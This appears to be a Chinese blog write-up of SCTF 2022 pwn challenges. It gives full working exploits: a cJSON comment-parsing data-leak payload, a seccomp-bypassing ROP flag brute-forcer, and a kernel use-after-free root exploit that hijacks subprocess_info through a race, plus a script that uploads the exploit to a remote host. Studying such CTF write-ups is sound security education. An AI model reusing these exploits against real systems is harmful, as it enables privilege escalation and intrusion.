---
title: SCTF-PWN
date: 2022-01-10 00:53:24
tags:
    - 爆破模板
    - kernel uaf
    - 堆喷
---

> 说下我的情况，做出了dataleak和gadget，至于kernel那道，明显的uaf，当时确实没那个能力做得出。

### dataleak

* 听其他师傅说是某个cve，出题师傅用心了。


* payload ：
  
  ` echo "AAAAAAAAAAAA/*AAAA        /*AAAAA       /*            /*" | ./cJSON_PWN`
  `(echo "AAAAAAAAAAAA/*AAAA        /*AAAAA       /*            /*";cat) | nc ip port`

思路
* 源码分析

```c
char *__fastcall cJSON_Minify(char *a1)
{
  char *result; // rax
  char *v2; // rax
  char v3; // cl
  char *v4; // rax
  char *v5; // rax
  char v6; // cl
  char *v7; // rax
  char *v8; // rax
  char v9; // cl
  char *v10; // rax
  char *v11; // [rsp+0h] [rbp-18h]
  char *v12; // [rsp+10h] [rbp-8h]

  v11 = a1;
  result = a1;
  v12 = a1;
  if ( a1 )
  {
    while ( *v11 )
    {
      switch ( *v11 )
      {
        case ' ':
          ++v11;
          break;
        case '\t':
          ++v11;
          break;
        case '\r':
          ++v11;
          break;
        case '\n':
          ++v11;
          break;
        default:
          if ( *v11 == '/' && v11[1] == '/' )
          {
            while ( *v11 && *v11 != '\n' )
              ++v11;
          }
          else if ( *v11 == '/' && v11[1] == '*' )
          {
            while ( *v11 && (*v11 != '*' || v11[1] != '/') )
              ++v11;
            v11 += 2;
          }
          else
          {
            if ( *v11 == '"' )
            {
              while ( 1 )
              {
                v5 = v11++;
                v6 = *v5;
                v7 = v12++;
                *v7 = v6;
                if ( !*v11 || *v11 == '"' )
                  break;
                if ( *v11 == '\\' )
                {
                  v2 = v11++;
                  v3 = *v2;
                  v4 = v12++;
                  *v4 = v3;
                }
              }
            }
            v8 = v11++;
            v9 = *v8;
            v10 = v12++;
            *v10 = v9;
          }
          break;
      }
    }
    result = v12;
    *v12 = 0;
  }
  return result;
}

void JSON_Minify(char *json) 
{
    char *into = json;
    while (*json) 
    {
        if (*json == ' ') json++;
        else if (*json == '\t') json++; // Whitespace characters.
        else if (*json == '\r') json++;
        else if (*json == '\n') json++;
        else if (*json == '/' && json[1] == '/') while (*json && *json != '\n') json++; // double-slash comments, to end of line.
        else if (*json == '/' && json[1] == '*') {
            while (*json && !(*json == '*' && json[1] == '/')) json++;
            json += 2;
        }// multiline comments.
        else if (*json == '\"') 
        {
            *into++ = *json++;
            while (*json && *json != '\"') 
            {
                if (*json == '\\') *into++ = *json++;
                *into++ = *json++;
            }
            *into++ = *json++;
        }// string literals, which are \" sensitive.
        else *into++ = *json++; // All other characters.
    }
    *into = 0; // and null-terminate.
}
```
在google找到了源码，大致比对一下，意义是一样的。对着c语言审计，有两个逃逸的地方`/*`,`"\`，他们都会逃逸`\x00\x00`的字符串边界。

### gadget

* 算是五段rop，花了大概三个小时。
* call 指令，接受的直接要执行的地址，而不是接受指向要执行的地址的指针
* `call addr`与 `pop reg ; ret`结合可以作为了gadget，构造rop
* `asm("int 0x80") => '\xcd\x80'`和`asm("syscall") => '\x0f\x05'`，明显编码不同
* 出题人应该通过内联汇编的形式加入了0x80号终端的gadget。
* 32位时没有没有r数字的寄存器。所以对于64位下那些关于rn的寄存器的机器码在32位下就可能引发错误。

```python
#!/usr/bin/env python
import time
from pwn import *

local = 1
debug = 0
binary = "./gadget"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
elf = ELF(binary)
context.log_level = "debug" if debug else "info"

if local:
    # p = process(binary)
    libc = ELF(lib)
else :
    p = remote()
    lib = "./libc.so.6"
    libc = ELF(lib)

s      = lambda buf        : p.send(buf)
sl     = lambda buf        : p.sendline(buf)
sa     = lambda delim, buf : p.sendafter(delim, buf)
sal    = lambda delim, buf : p.sendlineafter(delim, buf)
sh     = lambda            : p.interactive()
r      = lambda n=None     : p.recv(n)
ru     = lambda delim      : p.recvuntil(delim)
r7f    = lambda            : u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
trs    = lambda addr       : libc.address+addr
gadget = lambda ins        : libc.search(asm(ins,arch="amd64")).next()
tohex  = lambda buf        : "".join("\\x%02x"%ord(_) for _ in buf)


def pwn(p,index,offset):
	bss = 0x40c000
	payload = ""
	payload += "A"*0x30
	payload += "B"*8

	# A preparation in bss+0x1000-0x500
	payload += p64(0x0000000000401734) # : pop rdi ; pop rbp ; ret
	payload += p64(bss+0x1000-0x500)
	payload += p64(0)
	payload += p64(0x0000000000401170) # read in bss

	# real coming rop
	payload += p64(0x0000000000401734) # : pop rdi ; pop rbp ; ret
	payload += p64(bss+0x1000-0x8)
	payload += p64(0)
	payload += p64(0x0000000000401170) # read in bss

	payload += p64(0x0000000000401730) # : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p64(bss+0x1000)
	# raw_input("Break1")
	sl(payload)


	payload = ""
	payload += p64(0)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x40172f) # : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p64(0x200)
	payload += p64(0x0000000000401102)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x402c07) # <libc_start_main_stage2+32>:	mov    rdx,r12
	payload += p64(0x0000000000401734) # : pop rdi ; pop rbp ; ret
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x0000000000401732) # : pop rsi ; pop r15 ; pop rbp ; ret
	payload += p64(bss+0x1000+0x200+0x200)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x0000000000401001) # : pop rax ; ret
	payload += p64(0)
	payload += p64(0x0000000000408865) # : syscall
	payload += p64(0x0000000000401730) # : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p64(bss+0x1000+0x200+0x200)
	# raw_input("Break2")
	sl(payload)


	payload = ""
	payload += "/flag".ljust(8,"\x00")
	payload += p64(0)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x40172f) # : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p64(0x7)
	payload += p64(0x0000000000401102)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x402c07) # <libc_start_main_stage2+32>:	mov    rdx,r12
	payload += p64(0x00000000004011ed) # : retf
	payload += p32(0x403072) #: pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p32(0x23)
	payload += p32(bss+0x1000-0x8)
	payload += p32(0)
	payload += p32(0)
	payload += p32(0)
	payload += p32(0x40117b) # : pop rcx ; ret
	payload += p32(0)
	payload += p32(0x401001) # : pop rax ; ret
	payload += p32(0x5)
	payload += p32(0x4011f3) # : int 0x80
	payload += p32(0x4011ed) # : retf
	payload += p32(0x401734) # : pop
	payload += p32(0x33)
	payload += p64(bss+0x1000+0x200)
	payload += p64(0)
	payload += p64(0x0000000000401170) # read in bss
	payload += p64(0x0000000000401730) # : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p64(bss+0x1000+0x200)
	# raw_input("Break3")
	sl(payload)


	payload = ""
	payload += p64(0)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x40172f) # : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p64(0x200)
	payload += p64(0x0000000000401102)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x402c07) # <libc_start_main_stage2+32>:	mov    rdx,r12
	payload += p64(0x0000000000401734) # : pop rdi ; pop rbp ; ret
	payload += p64(3)
	payload += p64(0)
	payload += p64(0x0000000000401732) # : pop rsi ; pop r15 ; pop rbp ; ret
	payload += p64(bss)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x0000000000401001) # : pop rax ; ret
	payload += p64(0)
	payload += p64(0x0000000000408865) # : syscall
	payload += p64(0x0000000000401730) # : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p64(bss+0x1000-0x500)
	# raw_input("Break4")
	s(payload)


	# index = 0
	# offset = 0x66
	border = 0x40e000+0x27-0x8

	payload = ""
	payload += p64(0)*3

	# set rdx border 
	payload += p64(0x40172f) # : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p64(border-offset)      # <= rdx
	payload += p64(0x401102)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x402c07) # <libc_start_main_stage2+32>:	mov    rdx,r12

	# set rsi flag_addr
	payload += p64(0x0000000000401732) # : pop rsi ; pop r15 ; pop rbp ; ret
	payload += p64(bss)
	payload += p64(0)
	payload += p64(0)

	# set rax index
	payload += p64(0x0000000000401001) # : pop rax ; ret
	payload += p64(index)

	# set rbx sero
	payload += p64(0x403072) #: pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret
	payload += p64(0)
	payload += p64(0x0000000000401002) # RET
	payload += p64(0)*2
	payload += p64(0x00000000004011be)

	'''
	.text:00000000004011BE                 mov     bl, [rsi+rax]
	.text:00000000004011C1                 mov     rdi, rbx
	.text:00000000004011C4                 push    r14
	.text:00000000004011C6                 retn
	'''
	payload += p64(0x403beb) # : mov qword ptr [rdi + rdx - 0x27], rax ; mov rax, rdi ; ret

	payload += p64(0x0000000000401734) # : pop rdi ; pop rbp ; ret
	payload += p64(bss+0x1000-0x200)   # tmp
	payload += p64(0)
	payload += p64(0x0000000000401170) # read in bss

	sl(payload)
	p.recv(timeout=1)

# while True:
if __name__ == '__main__':
	flag = ""
	for index in range(0x30):
		for offset in range(0x20,0x7f):
			try:
				p = process(binary)
				pwn(p,index,offset)
				flag += chr(offset)
				break
				# sh()
			except:
				print("[+] testing %c flag => %s"%(offset,flag))
				p.close()




'''
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x25 0x03 0x00 0x40000000  if (A > 0x40000000) goto 0005
 0002: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0006
 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006
 0004: 0x15 0x01 0x00 0x00000025  if (A == alarm) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW

0x000000000040288d : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000040172f : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000040288f : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000401731 : pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000401733 : pop r15 ; pop rbp ; ret
0x0000000000401001 : pop rax ; ret
0x0000000000402890 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000401102 : pop rbp ; ret
0x000000000040172e : pop rbx ; pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000403072 : pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000040117b : pop rcx ; ret
0x0000000000401734 : pop rdi ; pop rbp ; ret
0x0000000000401732 : pop rsi ; pop r15 ; pop rbp ; ret
0x000000000040288e : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000401730 : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000401002 : ret


.text:00000000004011BE                 mov     bl, [rsi+rax]
.text:00000000004011C1                 mov     rdi, rbx
.text:00000000004011C4                 push    r14
.text:00000000004011C6                 retn



0x4011f3 <main+35>:	int    0x80
0x4011f5 <main+37>:	ret    


0x402c07 <libc_start_main_stage2+32>:	mov    rdx,r12
0x402c0a <libc_start_main_stage2+35>:	call   r14


0x00000000004011ed : retf

0x0000000000403beb : mov qword ptr [rdi + rdx - 0x27], rax ; mov rax, rdi ; ret

>>> from pwn import *
>>> elf = ELF("./gadget")
>>> print("".join(hex(_)+"\n" for _ in elf.search(asm("int 0x80",arch="i386"))))
0x4011f3

0x0000000000408865: syscall; ret; 


>>> asm("int 0x80",arch='i386')
# '\xcd\x80'

[+] testing 4 flag => SCTF{woww0w_y0u_1s_g4dget_m4

'''
```

原理 如此

```Bash
Gadget 1:
.text:00000000004011BE                 mov     bl, [rsi+rax]
.text:00000000004011C1                 mov     rdi, rbx
.text:00000000004011C4                 push    r14
.text:00000000004011C6                 retn
rdi = rbx = rsi[rax] = flag[rax] = flag[index]

Gadget 2:
mov qword ptr [rdi + rdx - 0x27], rax ; mov rax, rdi ; ret


rdi + rdx -0x27
= rdi + border - offset
= rdi-offset+border
= (flag[index]-offset) + border

flag[index]-offset >= 0  => panic
flag[index]-offset  < 0  => go on


(0x7f > offset >= flag[index])  => go no => wait（block）
(flag[index] > offset < 0x20 )  => panic => error

```


### flying-kernel

* 明显的uaf，申请的0x80是kmalloc-128，在下面引用的文章中可以查询对于不同的kmem_cache的利用方法。
* poc.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <sys/socket.h>

uint64_t D_base;
uint64_t K_base;

#define D(addr)        (uint64_t)((D_base)+(addr))
#define K(addr)        (uint64_t)((K_base)+(addr)-(0xFFFFFFFF81000000))
#define mmap3(addr)    mmap((void*)((addr)&(0xffffffff)&(~0xfffff)), 0x100000,7, MAP_PRIVATE|MAP_ANONYMOUS,-1,0)
  

#define ADD (0x5555)
#define FREE (0x6666)
#define SHOW (0x7777)



int fd;
int raceflag = 1;
uint64_t user_cs, user_ss, user_eflags,user_sp;

void save_stats() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
    printf("[*] save_stats\n");
}

void getshell()
{
    raceflag = 0;
    
    if(getuid() == 0)
    {
        system("/bin/sh");
    }
    printf("No root shell !!");
}

int del()
{
    return ioctl(fd,FREE,0x80);
}

int add()
{
    return ioctl(fd,ADD,0x80);
}

int show()
{
    return ioctl(fd,SHOW,0x80);
}

int race_to_write()
{
    void* addr;
    uint64_t *rsp;
    uint64_t *buf;

    buf = malloc(0x80);
    memset(buf,0,0x80);

/*
from pwn import *
vm = ELF("vmlinux")
print("".join(hex(_)+"\n" for _ in vm.search(asm("xchg esp,eax;ret",arch="amd64"))))
0xffffffff81011cb0
0xffffffff81014a6a
0xffffffff810758c8
*/

/*
commit_creds 0xffffffff8108c360
prepare_kernel_cred 0xffffffff8108c780

(vmlinux/ELF/x86_64)> search mov rdi,rax

0xffffffff819b5764: mov rdi, rax; je 0xbb576f; mov rax, rdi; pop rbx; pop rbp; ret; 
0xffffffff811b3ffa: mov rdi, rax; jne 0x3b3fca; pop rbx; ret; 
0xffffffff811b407a: mov rdi, rax; jne 0x3b404a; pop rbx; ret; 

*/
    
    int i;
    buf[0] = K(0xffffffff81011cb0);
    // *((uint64_t*)((char*)buf + 0x60)) = K(0xffffffff81011cb0); // xchgx esp,eax;ret
    
    addr = mmap3(K(0xffffffff81011cb0));
    if (addr == MAP_FAILED)
    {
        printf("mmap error");
        exit(-1);
    }

    rsp = (void*)(K(0xffffffff81011cb0)&(0xffffffff));

    i = 0;
    
    rsp[i++] = K(0xffffffff810016e9); // pop rdi;ret 
    rsp[i++] = 0;
    rsp[i++] = K(0xffffffff8108c780); // prepare_kernel_cred 
    rsp[i++] = K(0xffffffff819b5764); //mov rdi, rax; je 0xbb576f; mov rax, rdi; pop rbx; pop rbp; ret; 
    rsp[i++] = 0;
    rsp[i++] = 0;
    rsp[i++] = K(0xffffffff8108c360); // commit_cred
    
    rsp[i++] = K(0xffffffff81c00f58); // swapgs; ret;
    rsp[i++] = K(0xffffffff81024f92); // iretq; ret;
    rsp[i++] = (uint64_t)(getshell); 
    rsp[i++] = user_cs; 
    rsp[i++] = user_eflags; 
    rsp[i++] = user_sp; 
    rsp[i++] = user_ss; 

    while(raceflag)
    {
        write(fd,buf,0x20);
    }
}


int main()
{

    uint64_t addr;
    signal(SIGSEGV,getshell);

    fd = open("/dev/seven",2);
    if(fd == -1)
    {
        printf("[!] open fails!");
        exit(-1);
    }


    add();
    write(fd,"%llx %llx %llx %llx %llx %llx",0x80);
    show();
    show();
    scanf("%llx",&addr);
    K_base = addr - 0xffffffffa3bf3ecd + 0xffffffffa3a00000;

    printf("[+] K_base => %p\n",(void*)K_base);
    printf("[+] gadget => %p\n",(void*)K(0xffffffff81011cb0));
    printf("[+] mmap   => %p\n", (void*)(K(0xffffffff81011cb0)&(0xffffffff)));


    save_stats();
    del();
    
    pthread_t thread_pid1;
    pthread_create(&thread_pid1,NULL,race_to_write,NULL);
    usleep(0.1);

    while(raceflag)
    {
        socket(22, AF_INET, 0);
    }    
    pthread_join(thread_pid1,NULL);
    
    return 0;
}
```

* send.py

```python
#!/bin/sh
import os
from pwn import *

def cmd(cmd):
    io.sendline(cmd)
    buf = io.recvuntil("$ ")
    return buf

def pwn():
    SIZE = 0x200
    FILE = "poc" 
    
    os.popen("musl-gcc -o %s -static poc.c"%FILE).read()
    md5 = os.popen("md5sum poc").read()
    
    with open("poc", "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data)
    
    io.sendlineafter("$ ","cd /tmp")
    for i in range(0, len(encoded), SIZE):
        info("%d / %d" % (i, len(encoded)))
        cmd("echo \"%s\" >> /tmp/base" % (encoded[i:i+SIZE]))
    cmd("cat /tmp/base | base64 -d > /tmp/poc")
    cmd("chmod +x /tmp/poc")
    info("Done! md5 => %s"%md5)
    io.sendlineafter("$ ","md5sum /tmp/poc")
    io.interactive()

if __name__ == '__main__':
    io = remote("47.97.109.170","3001")
    # io = process('./boot.sh', shell=True)
    pwn()
```

* 讨论下这个做法

思路就是`socket(22, AF_INET, 0)`，执行时，没有22号协议族会有
`call_usermodehelper -> call_usermodehelper_setup -> kzalloc(sizeof(struct subprocess_info), gfp_mask)`这样的调用链来从kmalloc-128中取出一块。

[subprocess_info](https://elixir.bootlin.com/linux/v5.8.18/source/include/linux/umh.h#L19)结构体各版本有细微差异。本题中在info+0x60的地方是cleanup指针。
```c
/*
$ file bzImage 
user/bzImage: Linux kernel x86 boot executable bzImage, version 5.8.18 (root@3bdbf71203d5) #2 SMP Fri Dec 17 12:06:32 UTC 2021, RO-rootFS, swap_dev 0x8, Normal VGA
找到
*/
struct subprocess_info {
	struct work_struct work;
	struct completion *complete;
	const char *path;
	char **argv;
	char **envp;
	struct file *file;
	int wait;
	int retval;
	pid_t pid;
	int (*init)(struct subprocess_info *info, struct cred *new);
	void (*cleanup)(struct subprocess_info *info);
	void *data;
} __randomize_layout;
```

之后有`call_usermodehelper -> call_usermodehelper_exec -> call_usermodehelper_freeinfo -> (*info->cleanup)(info);`一条链来清理。
```c
static void call_usermodehelper_freeinfo(struct subprocess_info *info)
{
	if (info->cleanup)
		(*info->cleanup)(info);
	kfree(info);
}
```
Attention!!,很显然，cleanup之后立即进行了free。需要在`(*info->cleanup)(info);` 之前修改cleanup指针为gadget就行。所以必须要竞争的。

### 一些其他的东西

* `#` 和 `##` 用法

> The # operator, which is generally called the stringize operator, turns the argument it precedes into a quoted string

>The ‘##’ pre-processing operator allows tokens used as actual arguments to be concatenated to form other tokens. It is often useful to merge two tokens into one while expanding macros. This is called token pasting or token concatenation. When a macro is expanded, the two tokens on either side of each ‘##’ operator are combined into a single token, which then replaces the ‘##’ and the two original tokens in the macro expansion.
```c
#include <stdio.h>

#define mkstr(s) #s
#define concat(a, b) a##b

int main(void)
{
    int xy = 30;
    printf("%d", concat(x, y));
    printf(mkstr(geeksforgeeks));
    return 0;
}
/* output:
30
geeksforgeeks
*/
```
很显然，这些灵活到难以相信是C语言语法，他们都是预处理的语句.
![](https://files.catbox.moe/pdu1pz.png)
>Preprocessor programs provide preprocessors directives which tell the compiler to preprocess the source code before compiling. All of these preprocessor directives begin with a ‘#’ (hash) symbol. The ‘#’ symbol indicates that, whatever statement starts with #, is going to the preprocessor program, and preprocessor program will execute this statement. Examples of some preprocessor directives are: #include, #define, #ifndef etc. Remember that # symbol only provides a path that it will go to the preprocessor, and command such as include is processed by preprocessor program. For example, include will include extra code to your program. We can place these preprocessor directives anywhere in our program. 

预处理语句
* Macros
  * `#define LIMIT 5`
  * `#define AREA(l, b) (l * b)`
* File Inclusion
  * `#include< file_name >`
  * `#include"filename"` 
* Conditional Compilation
  * `#ifdef #endif` 
* Other directives
  * `#undef LIMIT` 
---


### Reference
* [kernel exploit 有用的结构体——spray&victim](https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/)
* [Kernel Exploitで使える構造体集](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)
* [CVE-2016-6187复现以及struct subprocess_info的劫持](https://kagehutatsu.com/?p=504)
* [ASIS CTF 2020 Quals (kernel exploit)](https://smallkirby.hatenablog.com/entry/2021/02/13/230520)